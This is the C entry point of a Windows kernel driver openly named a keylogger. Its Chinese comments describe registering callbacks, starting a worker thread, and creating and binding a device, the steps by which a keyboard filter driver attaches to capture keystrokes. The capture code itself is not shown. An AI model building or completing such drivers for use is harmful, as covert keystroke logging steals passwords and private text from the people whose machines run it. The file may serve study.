#include <ntddk.h>
#include "KeyLoger.h"

PTHREADCONTEXT g_pThreadContext;

NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)
{
#ifdef DBG
	__debugbreak();
#endif

	DbgPrint("Keyloger DriverEntry Enter\n");

	//填写回调函数
	NTSTATUS ntRet = InitKeylogger(DriverObject, RegistryPath);
	if (ntRet != STATUS_SUCCESS)
	{
		goto SAFE_EXIT;
	}
	
	//初始化线程的环境
	ntRet = InitKeyloggerEnv(DriverObject);
	if (ntRet != STATUS_SUCCESS)
	{
		goto SAFE_EXIT;
	}

	//创建线程
	ntRet = InitKeyloggerThread(DriverObject);
	if (ntRet != STATUS_SUCCESS)
	{
		goto SAFE_EXIT;
	}

	//创建并绑定设备
	ntRet = CreateAndBindDevice(DriverObject);
	if (ntRet != STATUS_SUCCESS)
	{
		goto SAFE_EXIT;
	}

SAFE_EXIT:
	DbgPrint("Keyloger DriverEntry Leave\n");

	return STATUS_SUCCESS;
}